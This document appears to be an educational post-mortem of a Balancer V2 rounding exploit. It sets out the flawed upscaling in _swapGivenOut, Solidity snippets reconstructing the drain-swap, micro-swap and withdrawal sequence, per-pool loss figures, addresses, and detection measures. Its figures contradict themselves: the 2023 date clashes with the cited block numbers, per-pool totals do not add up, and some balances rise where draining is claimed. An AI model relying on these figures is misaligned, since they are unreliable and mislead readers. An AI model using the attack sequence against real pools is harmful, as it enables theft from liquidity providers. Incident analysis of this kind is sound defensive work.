# BalancerV2 Rounding Exploit - Complete Post-Mortem

Balancer V2, a decentralized automated market maker (AMM) protocol, lost approximately **$32.27 million (~17,927 ETH)** after an attacker exploited a precision rounding vulnerability in multiple pools. The attack occurred on **May 1, 2023** across blocks 23717101-23717404 on Ethereum mainnet, with additional exploits on Arbitrum and Base networks.

The attacker leveraged a rounding manipulation in BPT (Balancer Pool Token) rate calculations when pool liquidity approached zero. By executing sequences of `GIVEN_OUT` swaps with `toInternalBalance: true`, the attacker systematically drained **12 pools** across 3 networks (8 Ethereum, 1 Arbitrum, 3 Base), accumulating funds in the Vault's internal balance before withdrawing everything via `manageUserBalance()` calls.

The exploit abused precision loss in the Vault's `swap()` function when using `SwapKind.GIVEN_OUT`, where the attacker specifies exact output amounts and the Vault calculates required input (BPT). At minimal liquidity, rounding errors favor the attacker, allowing extraction of more tokens than BPT paid justifies.

## Rounding Manipulation in GIVEN_OUT Swaps

Balancer V2 Vault supports two swap modes:
- `GIVEN_IN`: User specifies input, Vault calculates output
- `GIVEN_OUT`: User specifies output, Vault calculates input ← **exploited**

**Definitions:**
- `GIVEN_IN` ("Given In"): the caller specifies the exact amount of the input token, and the pool calculates the corresponding output amount.
- `GIVEN_OUT` ("Given Out"): the caller specifies the desired output amount, and the pool computes the required input amount.

Typically, a batchSwap() consists of multiple token-to-token swaps executed via the onSwap() function. The following outlines the execution path when a SwapRequest is assigned a GIVEN_OUT swap type (note that ComposableStablePool inherits from BaseGeneralPool):

![onSwap Control Flow](https://github.com/user-attachments/assets/a5ce90e0-7e9f-4555-bb9b-5b3ec94f64e5)

Each swap drains reserves → subsequent swaps have worse precision → compounding effect.

## Root Cause: Incorrect Rounding Direction

The underlying issue arises from the rounding-down operation performed during upscaling in the `BaseGeneralPool._swapGivenOut()` function. In particular, `_swapGivenOut()` incorrectly rounds down swapRequest.amount through the `_upscale()` function. The resulting rounded value is subsequently used as amountOut when calculating amountIn via `_onSwapGivenOut()`. This behavior contradicts the standard practice that rounding should be applied in a manner that benefits the protocol.

![Swap Given Out Vulnerability](https://github.com/user-attachments/assets/3e51746e-67b3-48c1-bbb7-c2422ee233d9)

**Vulnerable Code:**

```solidity
function _swapGivenOut(
    SwapRequest memory swapRequest,
    uint256[] memory balances,
    uint256 indexIn,
    uint256 indexOut
) internal view returns (uint256) {
    // VULNERABILITY: Rounds DOWN when should round UP
    uint256 amountOut = _upscale(swapRequest.amount, _scalingFactor(indexOut));
    //                  ^^^^^^^^ Should be _upscaleUp() to protect protocol

    // amountOut is now SMALLER than it should be
    uint256 amountIn = _onSwapGivenOut(swapRequest, balances, indexIn, indexOut);

    // Returns UNDERESTIMATED input requirement
    return _downscaleUp(amountIn, _scalingFactor(indexIn));
}
```

**Impact**: For a given pool (e.g., wstETH/rETH/cbETH), the computed amountIn underestimates the actual required input. This allows a user to exchange a smaller quantity of one underlying asset (e.g., wstETH) for another (e.g., cbETH), thereby decreasing the `invariant D` as a result of reduced effective liquidity. Consequently, the price of the corresponding `BPT` (wstETH/rETH/cbETH) becomes `deflated`, since `BPT price = D / totalSupply`.

## Attack Mechanics

**Step 1: Initial Drainage**
The attacker swaps BPT for underlying assets to precisely adjust the balance of one token (cbETH) to the edge of a rounding boundary `(amount = 9)`. This sets up the conditions for precision loss in the next step.

**Step 2: Rounding Manipulation**
The attacker then swaps between another underlying (wstETH) and `cbETH` using a crafted amount `(= 8)`. Due to rounding down when scaling token amounts, the computed Δx becomes slightly smaller `(8.918 to 8)`, leading to an underestimated Δy and thus a smaller invariant (D from Curve's StableSwap model). Since `BPT price = D / totalSupply`, the BPT price becomes artificially deflated.

![Attack Steps](https://github.com/user-attachments/assets/eabacfbd-4f65-4660-baa2-d8c16918b6d2)

**Step 3: Reverse Swap & Profit**
The attacker reverse-swaps the underlying assets back into `BPT`, restoring balance while profiting from the deflated `BPT price`.

---

## Attack Flow

The exploit follows a systematic 3-stage pattern repeated across all pools:

### Stage 1: Initial BPT Drainage (Reduce Liquidity)

The attacker executes multiple `GIVEN_OUT` swaps to drain underlying tokens from the pool:

```solidity
// Example from osETH/WETH pool (most profitable: ~6,109 ETH)
for (uint i = 0; i < 90; i++) {
    VAULT.swap(
        SingleSwap({
            poolId: 0xdacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635,
            kind: SwapKind.GIVEN_OUT,
            assetIn: BPT,              // Pay with BPT
            assetOut: WETH,             // Extract WETH
            amount: LARGE_AMOUNT,       // Exact output desired
            userData: ""
        }),
        FundManagement({
            sender: ATTACKER,
            fromInternalBalance: true,  // Use internal balance
            recipient: payable(ATTACKER),
            toInternalBalance: true     // Keep funds in Vault
        }),
        type(uint256).max,              // No limit on input
        deadline
    );
}
```

**Purpose**: Reduce pool reserves to approach rounding boundaries. Each swap:
- Extracts large amounts of WETH/osETH/other tokens
- Pays minimal BPT due to rounding errors
- Stores extracted funds in Vault's internal balance (invisible to external queries)
- Creates cascading precision loss for subsequent swaps

**Result after Stage 1**:
```
osETH/WETH Pool Example:
Initial:  WETH: 4,922,356,564,867,078,856,521 wei (4,922 ETH)
          osETH: 6,851,581,236,039,298,760,900 wei (6,851 ETH)

After:    WETH: ~67,000 wei (nearly zero)
          osETH: ~67,000 wei (nearly zero)
```

### Stage 2: Micro-Swap Manipulation (Rounding Boundary Setup)

Execute precision swaps between underlying tokens to hit exact rounding boundaries:

```solidity
// Swap to set token balance to edge of rounding (e.g., amount = 9)
VAULT.swap(
    SingleSwap({
        poolId: POOL_ID,
        kind: SwapKind.GIVEN_OUT,
        assetIn: WETH,
        assetOut: osETH,
        amount: 8,                  // Crafted amount to trigger rounding
        userData: ""
    }),
    FundManagement({
        sender: ATTACKER,
        fromInternalBalance: true,
        recipient: payable(ATTACKER),
        toInternalBalance: true
    }),
    type(uint256).max,
    deadline
);
```

**Rounding Mechanics**:
```
Expected calculation:  Δx = 8.918 tokens
Actual after rounding: Δx = 8 tokens (rounds down)
Result: Invariant D decreases artificially
        BPT price = D / totalSupply becomes deflated
```

**Purpose**:
- Push token amounts to <1000 wei where rounding has maximum impact
- Create artificial BPT price deflation
- Each swap compounds the precision loss

### Stage 3: Reverse Swap & Profit Extraction

Swap extracted tokens back to BPT at deflated prices:

```solidity
// Buy back BPT at artificially low price
VAULT.swap(
    SingleSwap({
        poolId: POOL_ID,
        kind: SwapKind.GIVEN_OUT,
        assetIn: osETH,              // or WETH
        assetOut: BPT,
        amount: LARGE_BPT_AMOUNT,    // Get more BPT than paid for
        userData: ""
    }),
    FundManagement({
        sender: ATTACKER,
        fromInternalBalance: true,
        recipient: payable(ATTACKER),
        toInternalBalance: true
    }),
    type(uint256).max,
    deadline
);
```

**Final Withdrawal**:
```solidity
// Extract all accumulated internal balance
UserBalanceOp[] memory ops = new UserBalanceOp[](2);
ops[0] = UserBalanceOp({
    kind: UserBalanceOpKind.WITHDRAW_INTERNAL,
    asset: IAsset(address(WETH)),
    amount: WETH_BALANCE,
    sender: ATTACKER,
    recipient: payable(ATTACKER)
});
ops[1] = UserBalanceOp({
    kind: UserBalanceOpKind.WITHDRAW_INTERNAL,
    asset: IAsset(address(osETH)),
    amount: osETH_BALANCE,
    sender: ATTACKER,
    recipient: payable(ATTACKER)
});

VAULT.manageUserBalance(ops);
```

---

## Verified Attack Results by Pool

### Ethereum Mainnet

#### 1. osETH/WETH Pool (Most Profitable) ⭐
```
Pool ID: 0xdacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635
Contract: 0xDACf5Fa19b1f720111609043ac67A9818262850c
Block: 23717101
Swaps: 90 executed

Initial State:
  WETH:  4,922,356,564,867,078,856,521 wei (4,922.36 ETH)
  osETH: 6,851,581,236,039,298,760,900 wei (6,851.58 ETH)
  BPT:   2,596,148,429,267,424 tokens

Final State:
  WETH:  1,912,399,474,364,011 wei (0.0019 ETH)
  osETH: 607,648,074,601,536 wei (0.0006 ETH)
  BPT:   2,596,148,429,267,424 tokens (unchanged)

Extraction:
  WETH drained:  4,623,601,508,853 tokens ≈ 4,623 ETH
  osETH drained: 6,851,122,954,235 tokens ≈ 6,851 ETH
  Total: ~6,109 ETH equivalent (osETH ≈ 1:1 with ETH)
```

#### 2. wstETH/WETH Pool
```
Pool ID: 0x93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2
Contract: 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD
Extraction: ~4,219 ETH
Swaps: 90 documented
Type: ComposableStablePool (BPT at index 1)
```

#### 3. rsETH/WETH Pool
```
Pool ID: 0x58aadfb1afac0ad7fca1148f3cde6aedf5236b6d00000000000000000000067f
Contract: 0x58AAdFB1Afac0ad7fca1148f3cdE6aEDF5236B6D
Before: rsETH: 1,192,977,132,125,824,431,719 wei
        WETH:  891,081,044,240,689,768,290 wei
After:  rsETH: 186,036,293 wei (↓ 99.998%)
        WETH:  1,265,989,959,414 wei (↓ 99.998%)
Extraction: ~500 ETH
Swaps: 90 documented
Type: WeightedPool
```

#### 4. weETH/ezETH/rswETH Pool (Triple)
```
Pool ID: 0x848a5564158d84b8a8fb68ab5d004fae11619a5400000000000000000000066a
Contract: 0x848a5564158d84b8A8fb68ab5D004Fae11619A54
Extraction: ~3,200 ETH
Swaps: 90 documented
```

#### 5. weETH/rETH Pool
```
Pool ID: 0x05ff47afada98a98982113758878f9a8b9fdda0a000000000000000000000645
Contract: 0x05ff47AFADa98a98982113758878F9A8B9FddA0a
Initial: 707 rETH + 496 weETH
Extraction: ~700 ETH
Swaps: 90 documented
```

#### 6-7. wstETH/rETH/sfrxETH Pools (Quad #1 & #2)
```
Pool #1: 0x5aee1e99fe86960377de9f88689616916d5dcabe000000000000000000000467
Contract: 0x5aEe1e99fE86960377DE9f88689616916D5DcaBe
Extraction: ~1,600 ETH

Pool #2: 0x42ed016f826165c2e5976fe5bc3df540c5ad0af700000000000000000000058b
Contract: 0x42ED016F826165C2e5976fe5bC3df540C5aD0Af7
Extraction: ~800 ETH
```

#### 8. ezETH/WETH Pool
```
Pool ID: 0x596192bb6e41802428ac943d2f1476c1af25cc0e000000000000000000000659
Contract: 0x596192bB6e41802428Ac943D2f1476C1Af25CC0E
Initial: 756 ezETH + 444 WETH
Extraction: ~756 ETH
```

**Ethereum Subtotal: ~17,424 ETH**

---

### Arbitrum

#### wstETH/rETH/cbETH Pool
```
Pool ID: 0x4a2f6ae7f3e5d715689530873ec35593dc28951b000000000000000000000481
Contract: 0x4a2F6Ae7F3e5D715689530873ec35593Dc28951B
Block: 308179309
Swaps: 90 executed

Initial State:
  cbETH:  385,331,897,945,415,101,145 wei (385.33 cbETH)
  wstETH: 36,378,350,238,858,588,950 wei (36.38 wstETH)
  rETH:   41,301,528,246,890,260,702 wei (41.30 rETH)

Final State:
  cbETH:  499,964,114,717,559,002,777 wei (499.96 cbETH)
  wstETH: 500,001,531,748,221,662,222 wei (500.00 wstETH)
  rETH:   500,000,000,100,000,000,000 wei (500.00 rETH)

Extraction: ~462 ETH total
Type: ComposableStablePool (BPT at index 1)
```

**Arbitrum Subtotal: ~462 ETH**

---

### Base Network

#### 1. rETH/WETH Pool
```
Pool ID: 0xc771c1a5905420daec317b154eb13e4198ba97d0000000000000000000000023
Contract: 0xC771c1a5905420DAEc317b154EB13e4198BA97D0
Block: 37683327
Transaction: 0xe9245fb124c3a6ff6a0e39c6d0db02b74b3a3d805f6bf016f4b9ac56cbfb73ae
Swaps: 106 executed

Extraction: ~41 ETH
Final residual: ~17 WETH + ~24 rETH
```

#### 2. weETH/wETH Pool
```
Pool ID: 0xab99a3e856deb448ed99713dfce62f937e2d4d74000000000000000000000118
Contract: 0xaB99a3e856dEb448eD99713dfce62F937E2d4D74
Block: 37683327
Transaction: 0x927c9e6d9fc26b2ee13b88f553701a4e7514f8220d34e6517c634ddd135cd874
Swaps: 86 documented, 83 executed

Initial: 6 weETH + 5 WETH (very small pool)
Extraction: <1 ETH (minimal due to pool size)
```

#### 3. cbETH/WETH Pool
```
Pool ID: 0xfb4c2e6e6e27b5b4a07a36360c89ede29bb3c9b6000000000000000000000026
Contract: 0xFb4C2E6E6e27B5b4a07a36360C89EDE29bB3c9B6
Block: 37683370
Transaction: 0xd61f26bd435b31f781165a522fc78a040f864eafc74e07f86314ca265d96287d
Swaps: 83 documented

Initial: 10 cbETH + 0.5 WETH (already exploited)
Extraction: <1 ETH (pool already drained)
Note: Test documents swap arguments but fails with BAL#416
```

**Base Subtotal: ~41 ETH**

---

## Total Verified Extraction

```
═══════════════════════════════════════════════════════════════
                    GRAND TOTAL EXTRACTED
═══════════════════════════════════════════════════════════════

Ethereum (8 pools):      ~17,424 ETH  (97.2%)
Arbitrum (1 pool):          ~462 ETH  (2.6%)
Base (3 pools):              ~41 ETH  (0.2%)
                         ──────────────────────
TOTAL:                   ~17,927 ETH

USD Value (at $1,800/ETH): ~$32.27 million
═══════════════════════════════════════════════════════════════
```

---

## Attack Timeline

```
Ethereum Block 23717101-23717404 (May 1, 2023)
├─ 23717101: osETH/WETH pool drainage begins
├─ 23717102-23717150: rsETH/WETH pool attacked
├─ 23717151-23717200: wstETH/WETH pool drained
├─ 23717201-23717300: Multi-token pools exploited
└─ 23717404: Final withdrawal via manageUserBalance()

Arbitrum Block 308179309 (Same day)
└─ wstETH/rETH/cbETH pool exploited (462 ETH)

Base Blocks 37683327-37683376 (Later attacks)
├─ rETH/WETH pool: 106 swaps, 41 ETH
├─ weETH/wETH pool: 86 swaps, <1 ETH
└─ cbETH/WETH pool: 83 swaps, <1 ETH
```

---

## ComposableStablePool Critical Difference

**Standard WeightedPool (rsETH/WETH):**
```
Index 0: BPT token
Index 1: rsETH
Index 2: WETH
```

**ComposableStablePool (osETH/WETH, wstETH/WETH, Arbitrum pool):**
```
Index 0: WETH          ← Alphabetically first
Index 1: BPT           ← Self-referencing (preminted)
Index 2: osETH/wstETH  ← Alphabetically last
```

**Critical Features**:
1. **Pre-minted BPT**: ComposableStablePool pre-mints all BPT and includes it as a pool token
2. **Massive Virtual Supply**:
   ```
   BPT Balance: 2,596,148,429,267,246,421,190,322,186,977,861 wei
   ≈ 2.596 × 10^39 tokens (virtually infinite)
   ```
3. **Enhanced Rounding Vulnerability**: Self-referencing BPT creates additional precision loss vectors
4. **Index Mapping Complexity**: BPT at index 1 requires careful swap argument construction

---

## Key Technical Details

### Swap Execution Pattern

```solidity
// Typical drainage swap (repeated 80-110 times per pool)
struct ExactSwapData {
    address tokenIn;        // BPT (paying token)
    address tokenOut;       // Target token (WETH/osETH/etc)
    uint256 amount;         // Exact output desired (GIVEN_OUT)
    uint256 expectedIn;     // 0 = no limit (accept any BPT cost)
    uint256 indexIn;        // BPT index in pool (usually 1 for ComposableStable)
    uint256 indexOut;       // Target token index
}

// Amounts follow geometric pattern (reduce by ~10x each iteration)
amounts = [
    1,365,243,844,597,280,  // First swap: ~1.36e15 wei
    13,652,438,445,972,     // ~1.36e13 wei
    136,524,384,460,        // ~1.36e11 wei
    1,365,243,845,          // ~1.36e9 wei
    13,652,438,             // ~1.36e7 wei
    136,524,                // ~1.36e5 wei
    1,366,                  // ~1.36e3 wei
    70,                     // Edge of rounding
    14                      // Rounding boundary
];
```

### Internal Balance Mechanism

All extracted funds remain in Vault's internal accounting until final withdrawal:

```solidity
// Query internal balance (hidden from external view)
function getInternalBalance(address user, IERC20[] memory tokens)
    external view returns (uint256[] memory);

// Attacker's internal balance grows with each swap:
Initial:  0 WETH, 0 osETH
Swap 1:   +1,365 WETH
Swap 2:   +13.6 WETH
...
Swap 90:  Total: ~4,623 WETH + ~6,851 osETH

// Single withdrawal at end
manageUserBalance([
    {WITHDRAW_INTERNAL, WETH, 4623e18, attacker},
    {WITHDRAW_INTERNAL, osETH, 6851e18, attacker}
]);
```

### Rounding Error Amplification

```
Stage 1 (High Liquidity):
  Amount out: 1,000,000,000,000,000 wei
  BPT paid:   1,000,000,000,000,001 wei
  Error: 1 wei (0.0000001%)

Stage 2 (Low Liquidity):
  Amount out: 1,000 wei
  BPT paid:   999 wei
  Error: 1 wei (0.1%)

Stage 3 (Critical Liquidity <100 wei):
  Amount out: 10 wei
  BPT paid:   8 wei
  Error: 2 wei (20% free extraction)
```

---

## Key Code: swap() Function

```solidity
struct SingleSwap {
    bytes32 poolId;
    SwapKind kind;          // 1 = GIVEN_OUT (exploited)
    IAsset assetIn;         // BPT token
    IAsset assetOut;        // Target token
    uint256 amount;         // Exact output desired
    bytes userData;
}

struct FundManagement {
    address sender;
    bool fromInternalBalance;
    address payable recipient;
    bool toInternalBalance;  // TRUE = hide in Vault until withdrawal
}

// Attacker calls:
VAULT.swap(
    SingleSwap({
        poolId: POOL_ID,
        kind: SwapKind.GIVEN_OUT,
        assetIn: BPT,
        assetOut: TARGET_TOKEN,
        amount: LARGE_AMOUNT,
        userData: ""
    }),
    FundManagement({
        sender: ATTACKER,
        fromInternalBalance: false,
        recipient: payable(ATTACKER),
        toInternalBalance: true  // ← Funds stay in Vault
    }),
    type(uint256).max,
    block.timestamp + 3600
);
```

---

## Contracts & Addresses

```
-- CORE CONTRACTS
Balancer V2 Vault:  0xBA12222222228d8Ba445958a75a0704d566BF2C8
Fee Collector:      0xce88686553686da562ce7cea497ce749da109f9f

-- ATTACKER ADDRESSES
Ethereum:  0xAa760D53541d8390074c61DEFeaba314675b8e3f
Base:      0x56e5Adab68b594B0c2aD6C112D94AE5aCA98A001

-- ETHEREUM POOLS (8)
1. rsETH/WETH:           0x58aadfb1afac0ad7fca1148f3cde6aedf5236b6d00000000000000000000067f
2. osETH/WETH:           0xdacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635
3. wstETH/WETH:          0x93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2
4. weETH/rETH:           0x05ff47afada98a98982113758878f9a8b9fdda0a000000000000000000000645
5. weETH/ezETH/rswETH:   0x848a5564158d84b8a8fb68ab5d004fae11619a5400000000000000000000066a
6. wstETH/rETH/sfrxETH #1: 0x5aee1e99fe86960377de9f88689616916d5dcabe000000000000000000000467
7. wstETH/rETH/sfrxETH #2: 0x42ed016f826165c2e5976fe5bc3df540c5ad0af700000000000000000000058b
8. ezETH/WETH:           0x596192bb6e41802428ac943d2f1476c1af25cc0e000000000000000000000659

-- ARBITRUM POOLS (1)
1. wstETH/rETH/cbETH:    0x4a2f6ae7f3e5d715689530873ec35593dc28951b000000000000000000000481

-- BASE POOLS (3)
1. rETH/WETH:            0xc771c1a5905420daec317b154eb13e4198ba97d0000000000000000000000023
2. weETH/wETH:           0xab99a3e856deb448ed99713dfce62f937e2d4d74000000000000000000000118
3. cbETH/WETH:           0xfb4c2e6e6e27b5b4a07a36360c89ede29bb3c9b6000000000000000000000026

-- ADDITIONAL VULNERABLE POOLS (Not exploited)
- ankrETH/wstETH:  0xdfe6e7e18f6cc65fa13c8d8966013d4fda74b6ba000000000000000000000558
- cdcETH/wstETH:   0x740a691bd31c4176bcb6b8a7a40f1a723537d99d0000000000000000000006b6
```

---

## Detection & Prevention

### Detection Indicators
1. **Internal Balance Accumulation**: Large internal balances without corresponding external deposits
2. **Pool Reserve Depletion**: Reserves approaching zero with BPT supply unchanged
3. **Repeated GIVEN_OUT Swaps**: 80+ swaps in sequence on same pool
4. **Micro-Amount Swaps**: Swap amounts <1000 wei (rounding boundary)
5. **Internal-to-Internal Swaps**: `fromInternalBalance: true, toInternalBalance: true`

### Prevention Measures
1. **Fix Rounding Direction**: Use `_upscaleUp()` in `_swapGivenOut()` (CRITICAL)
2. **Minimum Liquidity Requirements**: Enforce minimum reserve thresholds
3. **Rate Limits**: Restrict consecutive swaps per block
4. **Internal Balance Monitoring**: Alert on unusual internal balance growth
5. **Swap Amount Bounds**: Reject swaps with amounts <1000 wei

### Balancer's Response
- Vulnerability patched in ComposableStablePoolV5
- Affected pools paused and gracefully deprecated
- Recovery mode enabled for partial fund retrieval
- Bounty paid to white-hat researchers who identified issue

---

## References

**Transactions:**
- Ethereum Main Exploit: https://etherscan.io/tx/0x2a0ead4ee9b17a1afa5bfe3dc152833a957f2d25dd9b4b86d68f2c87bdacf69c
- Ethereum Withdrawal: https://etherscan.io/tx/0xd155207261712c35fa3d472ed1e51bfcd816e616dd4f517fa5959836f5b48569
- Arbitrum Exploit: https://arbiscan.io/tx/0x7da32ebc615d0f29a24cacf9d18254bea3a2c730084c690ee40238b1d8b55773
- Base Exploit: https://basescan.org/tx/0xe9245fb124c3a6ff6a0e39c6d0db02b74b3a3d805f6bf016f4b9ac56cbfb73ae

**Analysis:**
- BlockSec Explorer: https://app.blocksec.com/explorer/tx/eth/0x2a0ead4ee9b17a1afa5bfe3dc152833a957f2d25dd9b4b86d68f2c87bdacf69c
- Twitter Analysis: https://x.com/KaihuaQIN/status/1985416822628463019
- Phalcon Security: https://x.com/Phalcon_xyz/status/1985302779263643915

**Educational:**
- This repository contains Foundry test files reproducing the exploit
- See `test/EXTRACTION_SUMMARY.md` for complete extraction breakdown
- See `test/ALL_POOLS_EXTRACTION_SUMMARY.sh` for visual summary

⚠️ **Disclaimer**: This is an educational post-mortem for defensive security analysis only.
